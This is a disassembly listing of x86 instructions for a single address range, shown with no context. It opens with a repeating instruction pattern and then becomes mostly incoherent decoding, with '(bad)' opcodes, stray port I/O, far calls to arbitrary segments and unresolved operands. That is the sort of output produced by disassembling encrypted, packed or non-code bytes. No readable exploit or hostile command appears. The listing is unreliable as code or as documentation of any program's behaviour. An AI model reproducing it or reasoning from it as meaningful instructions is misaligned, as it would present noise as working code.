  421b98:	cmp    BYTE PTR [edx-0x67],ah
  421b9b:	sbb    al,0x5a
  421b9d:	sbb    BYTE PTR ds:0x59a865e4,dl
  421ba3:	jae    0x421b37
  421ba5:	cmp    BYTE PTR [edx-0x67],ah
  421ba8:	sbb    al,0x5a
  421baa:	sbb    BYTE PTR ds:0x59a865e4,dl
  421bb0:	jae    0x421b44
  421bb2:	cmp    BYTE PTR [edx-0x67],ah
  421bb5:	sbb    al,0x5a
  421bb7:	sbb    BYTE PTR ds:0x59a865e4,dl
  421bbd:	jae    0x421b51
  421bbf:	cmp    BYTE PTR [edx-0x67],ah
  421bc2:	sbb    al,0x5a
  421bc4:	sbb    BYTE PTR ds:0x59a865e4,dl
  421bca:	jae    0x421b5e
  421bcc:	cmp    BYTE PTR [edx-0x67],ah
  421bcf:	sbb    al,0x5a
  421bd1:	sbb    BYTE PTR ds:0x59a865e4,dl
  421bd7:	jae    0x421b6b
  421bd9:	cmp    BYTE PTR [edx-0x67],ah
  421bdc:	sbb    al,0x5a
  421bde:	sbb    BYTE PTR ds:0x59a865e4,dl
  421be4:	jae    0x421b78
  421be6:	cmp    BYTE PTR [edx-0x67],ah
  421be9:	sbb    al,0x5a
  421beb:	sbb    BYTE PTR ds:0x59a865e4,dl
  421bf1:	jae    0x421b85
  421bf3:	cmp    BYTE PTR [edx-0x67],ah
  421bf6:	sbb    al,0x5a
  421bf8:	sbb    BYTE PTR ds:0x59a865e4,dl
  421bfe:	jae    0x421b92
  421c00:	cmp    BYTE PTR [edx-0x67],ah
  421c03:	sbb    al,0x5a
  421c05:	sbb    BYTE PTR ds:0x59a865e4,dl
  421c0b:	jae    0x421b9f
  421c0d:	cmp    BYTE PTR [edx-0x67],ah
  421c10:	sbb    al,0x5a
  421c12:	sbb    BYTE PTR ds:0x59a865e4,dl
  421c18:	jae    0x421bac
  421c1a:	cmp    BYTE PTR [edx-0x67],ah
  421c1d:	sbb    al,0x5a
  421c1f:	sbb    BYTE PTR ds:0x59a865e4,dl
  421c25:	jae    0x421bb9
  421c27:	cmp    BYTE PTR [edx-0x67],ah
  421c2a:	sbb    al,0x5a
  421c2c:	sbb    BYTE PTR ds:0x59a3cd8b,dl
  421c32:	pop    esp
  421c33:	xchg   edx,eax
  421c34:	cmp    BYTE PTR [edx-0x67],dh
  421c37:	sbb    al,0x70
  421c39:	mov    edx,0x570395cf
  421c3e:	je     0x421c2d
  421c40:	adc    eax,0xf4af8f68
  421c45:	dec    ecx
  421c46:	lods   al,BYTE PTR ds:[esi]
  421c47:	add    BYTE PTR [edx+0x60032c14],0x23
  421c4e:	(bad)  
  421c4f:	je     0x421c45
  421c51:	clc    
  421c52:	rcr    BYTE PTR [ecx+0x3807cad3],1
  421c58:	dec    dx
  421c5a:	mov    eax,ds:0x3e8ed377
  421c5f:	pop    edx
  421c60:	aas    
  421c61:	mov    dl,0x6c
  421c63:	xor    cl,bh
  421c65:	xor    al,0xda
  421c67:	mov    al,ds:0xad8dbf05
  421c6c:	cmp    dl,BYTE PTR [edi]
  421c6e:	retf   
  421c6f:	rcr    dh,0xe4
  421c72:	mov    dh,BYTE PTR [esi-0x6c033f43]
  421c78:	repz cmp BYTE PTR ds:[esi+0x740294eb],dh
  421c80:	ss jmp 0x5eeb:0xd2da337e
  421c88:	cmp    al,0x99
  421c8a:	clc    
  421c8b:	sub    DWORD PTR [ebx],eax
  421c8d:	xchg   ecx,eax
  421c8e:	xchg   ebp,eax
  421c8f:	mov    eax,fs
  421c91:	stos   BYTE PTR es:[edi],al
  421c92:	ja     0x421c52
  421c94:	cmp    ebp,esp
  421c96:	test   esi,ebp
  421c98:	enter  0x67ff,0xbe
  421c9c:	(bad)  
  421c9e:	mov    cl,0x57
  421ca0:	mov    ebp,0x3affb527
  421ca5:	sbb    ah,bl
  421ca7:	xor    eax,0xdb4b432e
  421cac:	xor    ah,BYTE PTR [ebp-0x2dd7dbd7]
  421cb2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421cb3:	aaa    
  421cb4:	ror    esp,1
  421cb6:	test   DWORD PTR [edi-0x6d],ecx
  421cb9:	pop    ecx
  421cba:	sahf   
  421cbb:	lea    ebx,[ebx+ebp*2+0x56]
  421cbf:	int3   
  421cc0:	dec    edx
  421cc1:	pop    es
  421cc2:	adc    eax,0x9ac52010
  421cc7:	out    0x35,eax
  421cc9:	out    0xee,eax
  421ccb:	jmp    0x95025ec9
  421cd0:	xchg   edi,eax
  421cd1:	sub    BYTE PTR [ecx+0x6],ch
  421cd4:	rcr    DWORD PTR [eax+0x5a],cl
  421cd7:	cld    
  421cd8:	dec    ecx
  421cd9:	push   ds
  421cda:	mov    bl,0xcb
  421cdc:	call   0x93ab10f5
  421ce1:	xor    BYTE PTR [eax],ch
  421ce3:	add    dh,cl
  421ce5:	(bad)  
  421ce6:	fnsave [edx]
  421ce8:	and    DWORD PTR [edx],0xd75af006
  421cee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421cef:	adc    DWORD PTR [ebx],ecx
  421cf1:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  421cf3:	jne    0x421ce2
  421cf5:	push   eax
  421cf6:	jge    0x421c8f
  421cf8:	mov    ebp,0x4e729348
  421cfd:	fstp   TBYTE PTR [eax]
  421cff:	icebp  
  421d00:	mov    edi,0x36644e23
  421d05:	and    eax,0x9349bc6d
  421d0a:	mov    eax,0x5a20f259
  421d0f:	cs jp  0x421ce1
  421d12:	sbb    cl,BYTE PTR [ebx-0x1401b7b0]
  421d18:	or     esi,DWORD PTR ds:0x7902d158
  421d1e:	sub    DWORD PTR [esi+0x7a7afd45],edx
  421d24:	leave  
  421d25:	std    
  421d26:	inc    ecx
  421d27:	aad    0x13
  421d29:	call   0x92f:0xa2babbae
  421d30:	sahf   
  421d31:	jns    0x421d66
  421d33:	xchg   edx,eax
  421d34:	or     al,0xed
  421d36:	cmc    
  421d37:	cmp    BYTE PTR [esi],ah
  421d39:	sub    DWORD PTR [eax-0x7e],edx
  421d3c:	sbb    ebx,eax
  421d3e:	xor    ebp,DWORD PTR [edx]
  421d40:	ret    0xfa19
  421d43:	or     eax,0x65f26236
  421d48:	adc    eax,DWORD PTR [esi-0x55]
  421d4b:	push   ss
  421d4c:	fdivr  st,st(4)
  421d4e:	aam    0x14
  421d50:	inc    esi
  421d51:	or     edi,DWORD PTR [eax]
  421d53:	mov    dh,0x98
  421d55:	jne    0x421d58
  421d57:	iret   
  421d58:	in     al,0x73
  421d5a:	push   0x2d
  421d5c:	and    esi,DWORD PTR [edi+0x13990953]
  421d62:	fcmovu st,st(7)
  421d64:	pop    ecx
  421d65:	add    ecx,DWORD PTR fs:[ebx+0x72]
  421d69:	push   ds
  421d6a:	and    BYTE PTR [ebx],0xc1
  421d6d:	ret    
  421d6e:	mov    dl,dl
  421d70:	pop    edi
  421d71:	mov    ds:0x642b91e1,al
  421d76:	ins    DWORD PTR es:[edi],dx
  421d77:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421d78:	(bad)
  421d7b:	ins    DWORD PTR es:[edi],dx
  421d7c:	push   eax
  421d7d:	lock sub DWORD PTR [ecx+0x7690978d],ebx
  421d84:	push   cs
  421d85:	xor    eax,0x2cb76ca3
  421d8a:	bnd jae 0x421d55
  421d8d:	sti    
  421d8e:	jno    0x421dfc
  421d90:	adc    eax,0xae37757
  421d95:	xchg   esi,eax
  421d96:	inc    ebx
  421d97:	enter  0xc5f,0x1c
  421d9b:	xor    BYTE PTR [esi-0x1444f2b],ch
  421da1:	pmaxsw mm5,QWORD PTR [ebp+0x4e89a739]
  421da8:	jecxz  0x421e16
  421daa:	adc    al,0x38
  421dac:	lods   al,BYTE PTR ds:[esi]
  421dad:	dec    esi
  421dae:	ret    
  421daf:	pop    ebp
  421db0:	bound  ecx,QWORD PTR [edi]
  421db2:	cmp    al,0x42
  421db4:	mov    al,0x48
  421db6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421db7:	rcl    bl,1
  421db9:	pcmpgtb mm1,mm0
  421dbc:	dec    eax
  421dbd:	adc    eax,0x5b66365c
  421dc2:	fcom   DWORD PTR [ecx]
  421dc5:	or     al,0x24
  421dc7:	test   eax,0x52abcd2c
  421dcc:	push   0xac232367
  421dd1:	jnp    0x421ddd
  421dd3:	cmp    DWORD PTR [edx],ebx
  421dd5:	add    DWORD PTR [eax-0xc0898ca],eax
  421ddb:	call   0x5ed7:0x78dbc1dc
  421de2:	adc    ebx,DWORD PTR [edi]
  421de4:	mov    fs,WORD PTR [ebp-0x76614b8f]
  421dea:	jle    0x421e67
  421dec:	cmp    bh,ch
  421dee:	stos   BYTE PTR es:[edi],al
  421def:	add    eax,DWORD PTR [esi+0x18e45459]
  421df5:	dec    esp
  421df6:	sti    
  421df7:	and    bl,BYTE PTR [ebx+0x36]
  421dfa:	add    al,BYTE PTR [eax+0x62]
  421dfd:	int3   
  421dfe:	jne    0x421ddd
  421e00:	fadd   st(3),st
  421e02:	(bad)  
  421e05:	aam    0x74
  421e07:	add    al,0xe2
  421e09:	aad    0x8f
  421e0b:	dec    esp
  421e0c:	shl    DWORD PTR [edi-0x399e863d],0x31
  421e13:	leave  
  421e14:	clc    
  421e15:	sar    BYTE PTR [eax],1
  421e17:	in     eax,0xc4
  421e19:	add    BYTE PTR [ebp-0x20],bl
  421e1c:	gs cli 
  421e1e:	sti    
  421e1f:	push   0xffffff8a
  421e21:	and    edx,DWORD PTR [ebx-0x6a36ead2]
  421e27:	imul   edx,edi,0xffffff9d
  421e2a:	dec    ebp
  421e2b:	dec    edx
  421e2c:	push   esp
  421e2d:	sahf   
  421e2e:	lfs    ebp,FWORD PTR [eax+ecx*2+0x6d902867]
  421e36:	ins    BYTE PTR es:[edi],dx
  421e37:	test   eax,0x12ba6053
  421e3c:	frstor [ecx-0xd]
  421e3f:	call   0xd74cf35a
  421e44:	mov    ds:0x8ed94091,eax
  421e49:	sti    
  421e4a:	in     al,0x53
  421e4c:	xchg   ebx,eax
  421e4d:	out    0x13,al
  421e4f:	cmp    esi,esi
  421e51:	je     0x421e5a
  421e53:	pop    ss
  421e54:	or     dl,BYTE PTR ss:[esi]
  421e57:	ss inc esp
  421e59:	push   ecx
  421e5a:	outs   dx,BYTE PTR ds:[esi]
  421e5b:	imul   ecx,DWORD PTR [ebx],0x5
  421e5e:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  421e60:	add    dl,BYTE PTR [ebx-0x41bf7172]
  421e66:	and    al,0x44
  421e68:	xchg   edi,eax
  421e69:	push   esp
  421e6a:	pop    edx
  421e6b:	push   es
  421e6c:	fadd   QWORD PTR [edx+edi*8-0x5a]
  421e70:	out    dx,al
  421e71:	cmc    
  421e72:	inc    esi
  421e73:	inc    ebx
  421e74:	dec    ecx
  421e75:	or     dl,BYTE PTR [ebx+0x32]
  421e78:	js     0x421ef3
  421e7a:	popf   
  421e7b:	and    bh,BYTE PTR [ebx-0x67]
  421e7e:	daa    
  421e7f:	mov    eax,ds:0xbe63551a
  421e84:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421e85:	inc    ebx
  421e86:	fadd   QWORD PTR [eax+0x2023312b]
  421e8c:	cwde   
  421e8d:	dec    edx
  421e8e:	xchg   BYTE PTR [edx+ecx*2],dl
  421e91:	jne    0x421ee8
  421e93:	add    bh,BYTE PTR [esi+ebp*2]
  421e96:	scas   eax,DWORD PTR es:[edi]
  421e97:	jnp    0x421e33
  421e99:	addr16 pop ss
  421e9b:	ins    BYTE PTR es:[edi],dx
  421e9c:	add    esi,DWORD PTR [esi-0x25]
  421e9f:	adc    BYTE PTR [ecx-0x6],0x87
  421ea3:	in     eax,dx
  421ea4:	sub    eax,0x5d4c671b
  421ea9:	sbb    dl,0xac
  421eac:	retf   0xb373
  421eaf:	pop    ds
  421eb0:	out    dx,al
  421eb1:	(bad)  
  421eb2:	fcompp 
  421eb4:	lea    ecx,[esi+0x715e1e22]
  421eba:	or     ah,BYTE PTR [edx]
  421ebc:	mov    edi,0x73168cf4
  421ec1:	mov    WORD PTR ds:0x1daec553,fs
  421ec7:	adc    ch,bl
  421ec9:	cmp    BYTE PTR [esi+0x52],0x7d
  421ecd:	push   ds
  421ece:	push   eax
  421ecf:	fcom   QWORD PTR [edi+0xa]
  421ed2:	add    esi,DWORD PTR [eax*1-0x7a6d1aaf]
  421ed9:	sti    
  421eda:	xor    ebp,DWORD PTR [ebx-0x30]
  421edd:	add    bl,BYTE PTR [ebp-0x4e16931a]
  421ee3:	pop    ecx
  421ee4:	pop    edx
  421ee5:	int3   
  421ee6:	and    eax,edx
  421ee8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421ee9:	or     DWORD PTR [ecx+edi*4-0x2c],ecx
  421eed:	into   
  421eee:	mov    bl,0x29
  421ef0:	xchg   esi,eax
  421ef1:	test   DWORD PTR [ecx+0x7],eax
  421ef4:	push   edi
  421ef5:	xchg   ecx,eax
  421ef6:	aaa    
  421ef7:	push   cs
  421ef8:	pop    eax
  421ef9:	sub    ah,dl
  421efb:	inc    ebx
  421efc:	mov    ch,BYTE PTR [ebx]
  421efe:	sub    DWORD PTR [edi+0x6],0x63e20d9b
  421f05:	xchg   esp,eax
  421f06:	outs   dx,DWORD PTR ds:[esi]
  421f07:	rcl    DWORD PTR [edx+0x4e],0x53
  421f0b:	or     ch,bh
  421f0d:	dec    edx
  421f0e:	inc    ecx
  421f0f:	cwde   
  421f10:	and    bh,ch
  421f12:	add    al,BYTE PTR [edx+ecx*8-0x8dc3555]
  421f19:	sub    esp,DWORD PTR [ebp+0x71]
  421f1c:	jecxz  0x421edc
  421f1e:	ret    0x9a12
  421f21:	(bad)  
  421f22:	into   
  421f23:	dec    ebx
  421f24:	push   es
  421f25:	out    0x87,al
  421f27:	cmp    al,0x7d
  421f29:	dec    ebx
  421f2a:	fadd   DWORD PTR [eax+0x9533fff]
  421f30:	mov    cl,0x9b
  421f32:	mov    WORD PTR [eax-0x1e],ss
  421f35:	test   BYTE PTR [ebx],al
  421f37:	sub    eax,0x42ecfd7b
  421f3c:	cmp    BYTE PTR [edi+0x1eb023ad],ch
  421f42:	sbb    bl,BYTE PTR [edi+0x78]
  421f45:	xor    esi,ecx
  421f47:	push   eax
  421f48:	imul   ebx,DWORD PTR [esi+0x2d84f943],0x70
  421f4f:	pop    edi
  421f50:	cdq    
  421f51:	jb     0x421f2e
  421f53:	fstp   TBYTE PTR [edx+ecx*4-0x34]
  421f57:	je     0x421fce
  421f59:	jle    0x421fb8
  421f5b:	xchg   edx,eax
  421f5c:	out    0x94,al
  421f5e:	xchg   DWORD PTR [ebx-0x42],ecx
  421f61:	sbb    DWORD PTR [ebp+0x62],0x37
  421f65:	pop    esi
  421f66:	dec    esi
  421f67:	push   ds
  421f68:	ins    BYTE PTR es:[edi],dx
  421f69:	push   eax
  421f6a:	rcr    BYTE PTR ds:0xb9a69285,0x75
  421f71:	adc    eax,0xf2d8c535
  421f76:	pop    ebx
  421f77:	(bad)  [ebp+0x215c1ba5]
  421f7d:	mov    cl,0xab
  421f7f:	lods   al,BYTE PTR ds:[esi]
  421f80:	push   cs
  421f81:	sub    DWORD PTR [ebp+0x5828bbb4],0xffffff89
  421f88:	int3   
  421f89:	mov    dl,0x84
  421f8b:	xlat   BYTE PTR ds:[ebx]
  421f8c:	pop    ss
  421f8d:	outs   dx,BYTE PTR ds:[esi]
  421f8e:	xchg   ebp,eax
  421f8f:	popf   
  421f90:	sbb    edx,0xeb1db9b2
  421f96:	rcr    DWORD PTR [edx+0x57],cl
  421f99:	or     DWORD PTR [edx-0x5eef2b1d],ebx
  421f9f:	mov    bl,0xae
  421fa1:	adc    dl,BYTE PTR [ecx+esi*1-0x1e]
  421fa5:	add    DWORD PTR [eax+edi*2],ecx
  421fa8:	dec    edi
  421fa9:	imul   esi,DWORD PTR [esi-0x3bd19b53],0x9f4682f
  421fb3:	icebp  
  421fb4:	jg     0x421f9d
  421fb6:	(bad)  
  421fb8:	clc    
  421fb9:	stc    
  421fba:	je     0x421fae
  421fbc:	outs   dx,DWORD PTR ds:[esi]
  421fbd:	repnz and eax,0xb842824f
  421fc3:	jno    0x421f98
  421fc5:	inc    esi
  421fc6:	xchg   DWORD PTR [esi],ebx
  421fc8:	inc    edi
  421fc9:	test   DWORD PTR [eax],edi
  421fcb:	dec    ebx
  421fcc:	push   es
  421fcd:	rol    BYTE PTR [esi+edx*8],cl
  421fd0:	mov    esp,esp
  421fd2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421fd3:	pop    ss
  421fd4:	outs   dx,BYTE PTR ds:[esi]
  421fd5:	xchg   BYTE PTR [esi+0x8],ch
  421fd8:	or     BYTE PTR [edx+0x1d],ah
  421fdb:	jns    0x42200b
  421fdd:	mov    ecx,0x6ec9f0fa
  421fe2:	lock cmp al,0xb4
  421fe5:	jnp    0x42202f
  421fe7:	add    BYTE PTR [eax+eax*8+0x71],ah
  421feb:	dec    edx
  421fec:	xchg   esi,eax
  421fed:	pop    DWORD PTR [eax-0x61]
  421ff0:	mov    esp,0x8b3e126d
  421ff5:	mov    dl,0xd9
  421ff8:	and    ebp,ebp
  421ffa:	jle    0x422042
  421ffc:	pushf  
  421ffd:	nop
  421ffe:	icebp  
  421fff:	sahf   
  422000:	pop    ecx
  422001:	outs   dx,BYTE PTR ds:[esi]
  422002:	push   0x4a
  422004:	xchg   ebp,eax
  422005:	mov    esi,es
  422007:	mov    ebx,ss
  422009:	push   esp
  42200a:	retf   0x46c5
  42200d:	(bad)  
  42200e:	ins    DWORD PTR es:[edi],dx
  42200f:	data16 jae 0x42206e
  422012:	mov    esi,0x78c93326
  422017:	not    esi
  422019:	jno    0x421ffb
  42201b:	loope  0x42205a
  42201d:	mov    al,0xf3
  42201f:	jbe    0x422007
  422021:	and    ecx,esi
  422023:	arpl   si,bp
  422025:	adc    al,0x4b
  422027:	xchg   DWORD PTR [edx+0xd],ebx
  42202a:	and    ch,bh
  42202c:	pop    esi
  42202d:	pop    ebx
  42202e:	inc    eax
  42202f:	(bad)  
  422031:	ret    
  422032:	cmp    ah,BYTE PTR [esi+0x27]
  422035:	inc    ebx
  422036:	test   al,0x61
  422038:	outs   dx,DWORD PTR ds:[esi]
  422039:	pop    ss
  42203a:	inc    esp
  42203b:	or     eax,0x178ed401
  422040:	jle    0x421ff8
  422042:	mov    fs,WORD PTR [ecx]
  422044:	mov    ds:0x1de7737b,eax
  422049:	dec    edi
  42204a:	xor    eax,DWORD PTR [eax-0x16a0a33d]
  422050:	dec    esp
  422051:	stc    
  422052:	popf   
  422053:	int3   
  422054:	(bad)  
  422055:	dec    edi
  422056:	cmp    eax,0x250b7f71
  42205b:	dec    esp
  42205c:	call   0x33e9:0xaf77e042
  422063:	cmc    
  422064:	jbe    0x4220b4
  422066:	ds and eax,0xa7a9daf4
  42206c:	push   edx
  42206d:	or     bl,BYTE PTR [esi+0x7a831114]
  422073:	push   ecx
  422074:	adc    BYTE PTR [esi+0x69],bl
  422077:	leave  
  422078:	cmp    al,0x7d
  42207a:	xor    esi,edi
  42207c:	add    BYTE PTR [eax-0x2d8e71be],ch
  422082:	push   eax
  422083:	gs sbb al,0xd4
  422086:	scas   al,BYTE PTR es:[edi]
  422087:	test   eax,0x41cf6093
  42208c:	(bad)  
  42208d:	aas    
  42208e:	xchg   DWORD PTR [ebp-0x80],esi
  422091:	adc    edi,esi
  422093:	fwait
  422094:	xor    BYTE PTR [edx],dh
  422096:	icebp  
  422097:	mov    ecx,ecx
  422099:	jae    0x42210a
  42209b:	ret    
  42209c:	mov    ds,WORD PTR [ecx]
  42209e:	ins    BYTE PTR es:[edi],dx
  42209f:	push   eax
  4220a0:	int    0x82
  4220a2:	pop    ds
  4220a3:	push   cs
  4220a4:	mov    al,BYTE PTR [esi]
  4220a6:	mov    eax,0xbee18609
  4220ab:	fldcw  WORD PTR [ebx+0x76]
  4220ae:	push   ds
  4220af:	jmp    0x4b3dc3cd
  4220b4:	mov    ah,0x23
  4220b6:	pusha  
  4220b7:	add    ebp,DWORD PTR [ecx+0x6c467fd1]
  4220bd:	icebp  
  4220be:	(bad)  [eax]
  4220c0:	ds ret 0x1fd9
  4220c4:	popa   
  4220c5:	or     eax,0x10fa07fa
  4220ca:	xlat   BYTE PTR ds:[ebx]
  4220cb:	mov    eax,0xb5b100b1
  4220d0:	mov    ds:0x37463203,al
  4220d5:	add    BYTE PTR [ecx+ecx*8],bh
  4220d8:	pop    ss
  4220d9:	stc    
  4220da:	push   ds
  4220db:	sbb    cl,BYTE PTR [esi-0x69]
  4220de:	xchg   esp,eax
  4220df:	out    0x14,eax
  4220e1:	rcl    DWORD PTR [edx+0x39f42cf0],cl
  4220e7:	lock sub cl,BYTE PTR [esi+eiz*2]
  4220eb:	in     al,dx
  4220ec:	fs pop ecx
  4220ee:	push   ds
  4220ef:	nop
  4220f0:	repz loop 0x42211a
  4220f3:	(bad)  [eax+0x3]
  4220f6:	mov    ch,0x60
  4220f8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4220f9:	xchg   ecx,eax
  4220fa:	and    BYTE PTR [edi+0xbb32209],bh
  422100:	mov    ah,0xd0
  422102:	call   0x31a78ce5
  422107:	xor    DWORD PTR [edx],esi
  422109:	hlt    
  42210a:	or     DWORD PTR [eax-0x42],edi
  42210d:	mov    ecx,0xa1967f49
  422112:	jecxz  0x422125
  422114:	ret    0x65b6
  422117:	jg     0x422108
  422119:	sbb    eax,0x1a6d680e
  42211e:	ins    DWORD PTR es:[edi],dx
  42211f:	jp     0x422103
  422121:	dec    ebp
  422122:	and    al,0xcf
  422124:	jmp    0x4220c9
  422126:	sbb    BYTE PTR [esi+ebp*2],dh
  422129:	hlt    
  42212a:	ror    DWORD PTR [eax+0x2f94705e],0x28
  422131:	sbb    bh,BYTE PTR [eax-0x4]
  422134:	cwde   
  422135:	and    DWORD PTR [eax],ebp
  422137:	scas   al,BYTE PTR es:[edi]
  422138:	imul   ebp,DWORD PTR [esi-0x25],0x9fde66b
  42213f:	lods   al,BYTE PTR ds:[esi]
  422140:	add    DWORD PTR [eax],0x6285141
  422146:	jl     0x422179
  422148:	adc    BYTE PTR [esp+edx*4+0x1df05f6],0x2d
  422150:	xor    esi,DWORD PTR [edx+0x62]
  422153:	fiadd  WORD PTR [ebx]
  422155:	jne    0x422178
  422157:	call   0x9c4d:0xa2d95731
  42215e:	dec    edi
  42215f:	enter  0xdf7f,0x4a
  422163:	das    
  422164:	xchg   ecx,eax
  422165:	adc    eax,0x6aa0c9d8
  42216a:	aad    0xa9
  42216c:	pop    edx
  42216d:	cmp    edi,ebp
  42216f:	daa    
  422170:	sbb    eax,0xef07132c
  422175:	call   0x71a6fb94
  42217a:	mov    dh,0xf0
  42217c:	push   edx
  42217d:	hlt    
  42217e:	dec    edx
  42217f:	dec    ecx
  422180:	loop   0x42210e
  422182:	push   eax
  422183:	dec    ebx
  422184:	aad    0xdb
  422186:	jmp    0xe010c4a9
  42218b:	cld    
  42218c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42218d:	cmp    BYTE PTR [ebp-0x20],0xd3
  422191:	xchg   esp,eax
  422192:	inc    ebx
  422193:	cmp    BYTE PTR [esi+0x2a6f4865],cl
  422199:	fs loope 0x422129
  42219c:	sub    al,0x9f
  42219e:	ja     0x42218b
  4221a0:	aas    
  4221a1:	inc    eax
  4221a2:	dec    edi
  4221a3:	sbb    bh,BYTE PTR [ecx-0x6a]
  4221a6:	ja     0x4221da
  4221a8:	cld    
  4221a9:	lds    eax,FWORD PTR [eax+0x771fc5f9]
  4221af:	call   0xbce:0x9f408415
  4221b6:	mov    ch,0x34
  4221b8:	sub    al,0xbd
  4221ba:	loope  0x422144
  4221bc:	repnz xor al,0x8f
  4221bf:	jp     0x4221da
  4221c1:	mul    DWORD PTR [ecx+edi*1-0x36]
  4221c5:	shl    BYTE PTR [esi-0x2b],cl
  4221c8:	gs push ecx
  4221ca:	out    dx,al
  4221cb:	in     al,0x12
  4221cd:	mov    eax,ds:0xf6e1e406
  4221d2:	pop    edi
  4221d3:	dec    eax
  4221d4:	adc    dh,BYTE PTR ds:[ecx+ebp*1+0x7e]
  4221d9:	jecxz  0x422187
  4221db:	ficomp DWORD PTR [ebx-0x1ce785b7]
  4221e1:	mov    esi,DWORD PTR [ebx+0x4d]
  4221e4:	inc    esi
  4221e5:	push   eax
  4221e6:	(bad)  
  4221e7:	gs stos BYTE PTR es:[edi],al
  4221e9:	mov    al,0xb9
  4221eb:	jnp    0x42225e
  4221ed:	shl    DWORD PTR [edx-0x6e028d9c],1
  4221f3:	pop    ecx
  4221f4:	outs   dx,DWORD PTR ds:[esi]
  4221f5:	mov    ds:0x63ad5629,al
  4221fa:	stos   BYTE PTR es:[edi],al
  4221fb:	es js  0x4221b1
  4221fe:	out    0x4,al
  422200:	aas    
  422201:	cli    
  422202:	push   es
  422203:	xchg   BYTE PTR [ebp-0x6931a80d],ah
  422209:	pop    esp
  42220a:	iret   
  42220b:	scas   eax,DWORD PTR es:[edi]
  42220c:	neg    DWORD PTR [edx-0x48]
  42220f:	mov    eax,ds:0xf00e06dd
  422214:	mov    ah,0xa0
  422216:	mov    ecx,0xd00e8809
  42221b:	dec    ecx
  42221c:	das    
  42221d:	je     0x4221a2
  42221f:	out    0xb6,al
  422221:	shr    DWORD PTR [ecx-0x2ef81421],1
  422227:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  422229:	cs (bad) 
  42222b:	sub    BYTE PTR [ecx-0x6a],al
  42222e:	cmp    DWORD PTR [ebx-0x75],ebp
  422231:	add    ax,0x11ac
  422235:	or     cl,BYTE PTR [esi*8+0x6c01494b]
  42223c:	sub    BYTE PTR [eax+0x35603fee],bh
  422242:	xor    esi,ebx
  422244:	repz call 0x9522:0x1b0e69c6
  42224c:	mov    ch,0xd2
  42224e:	mov    cl,0xe7
  422250:	fisub  WORD PTR [ebx+0x759fe38b]
  422256:	stc    
  422257:	dec    ebp
  422258:	adc    esp,ebp
  42225a:	ja     0x422272
  42225c:	popa   
  42225d:	mov    dl,0xe8
  42225f:	cmp    DWORD PTR [ecx],ebx
  422261:	dec    ecx
  422262:	cmc    
  422263:	add    di,WORD PTR [ebx-0x64]
  422267:	js     0x422276
  422269:	clc    
  42226a:	add    ebp,DWORD PTR [eax]
  42226c:	clc    
  42226d:	rcl    BYTE PTR [esi-0x172af116],cl
  422273:	or     edi,DWORD PTR [edi-0x3f]
  422276:	shr    DWORD PTR [eax],0xa0
  422279:	aam    0x4c
  42227b:	add    eax,0xe1011501
  422280:	cwde   
  422281:	inc    ebp
  422282:	clc    
  422283:	push   cs
  422284:	adc    DWORD PTR [esp+ecx*4+0x13305040],ebx
  42228b:	js     0x42223e
  42228d:	js     0x42230c
  42228f:	das    
  422290:	loopne 0x4222a0
  422292:	mov    edi,0x2690b8e0
  422297:	inc    ecx
  422298:	mov    bh,BYTE PTR [ebx-0x76]
  42229b:	imul   edx,DWORD PTR [ebx],0xfffffff4
  42229e:	mov    ?,WORD PTR [edx+eiz*8+0x6c30a3bf]
  4222a5:	adc    ah,BYTE PTR [edx+0x15515c24]
  4222ab:	imul   edi,DWORD PTR [ebx],0x28
  4222ae:	mov    cl,0x88
  4222b0:	stc    
  4222b1:	sub    DWORD PTR [edi],esp
  4222b3:	mov    al,0xe5
  4222b5:	shr    DWORD PTR [edi-0xee56be8],0xe0
  4222bc:	ds pop ds
  4222be:	ds xor al,0x4a
  4222c1:	popf   
  4222c2:	xor    al,0xd1
  4222c4:	loop   0x42226a
  4222c6:	or     eax,0x488269f2
  4222cb:	out    0xe8,eax
  4222cd:	mov    esi,0xc112436b
  4222d2:	(bad)  
  4222d3:	pop    esp
  4222d4:	gs adc bh,bh
  4222d7:	sub    BYTE PTR [edi-0x1da4a6e9],0xf2
  4222de:	aad    0x0
  4222e0:	(bad)  
  4222e1:	sbb    esi,ebp
  4222e3:	stos   BYTE PTR es:[edi],al
  4222e4:	xor    esp,DWORD PTR [edx+0x3c4928dd]
  4222ea:	arpl   WORD PTR [eax+0x6291ceb5],cx
  4222f0:	and    DWORD PTR [edi+ecx*1-0x424f9d8c],esi
  4222f7:	add    BYTE PTR [ecx],bl
  4222f9:	push   edi
  4222fa:	daa    
  4222fb:	mov    ebx,0x1ae937b
  422300:	fcmovnbe st,st(7)
  422302:	adc    eax,0x58a3a771
  422307:	push   cs
  422308:	xor    BYTE PTR [edx-0x278bd2],bl
  42230e:	stos   BYTE PTR es:[edi],al
  42230f:	cmp    al,0x56
  422311:	push   es
  422312:	(bad)  
  422313:	int    0xa4
  422315:	vmovntps XMMWORD PTR [esi+0x53],xmm5
  42231a:	jge    0x4222c4
  42231c:	adc    dh,al
  42231e:	lea    ecx,[edi-0x20fb16fb]
  422324:	xchg   ecx,eax
  422325:	outs   dx,DWORD PTR ds:[esi]
  422326:	aas    
  422327:	out    dx,eax
  422328:	retf   
  422329:	imul   esi,ebp,0xffffffb4
  42232c:	xchg   ebp,eax
  42232d:	retf   
  42232e:	xlat   BYTE PTR ds:[ebx]
  42232f:	push   cs
  422330:	jnp    0x422306
  422332:	or     edx,ecx
  422334:	addr16 and eax,0x68d20891
  42233a:	cmp    eax,0x7df34f7e
  42233f:	inc    edx
  422340:	imul   edx,DWORD PTR [eax-0x80],0xffffffa8
  422344:	inc    eax
  422345:	adc    BYTE PTR [ecx],ah
  422347:	mov    ds:0x662f8aa2,eax
  42234c:	inc    eax
  42234d:	aaa    
  42234e:	mov    WORD PTR [edi+0x249f5c0d],ss
  422354:	les    ecx,FWORD PTR [eax+0xd]
  422357:	mov    edi,?
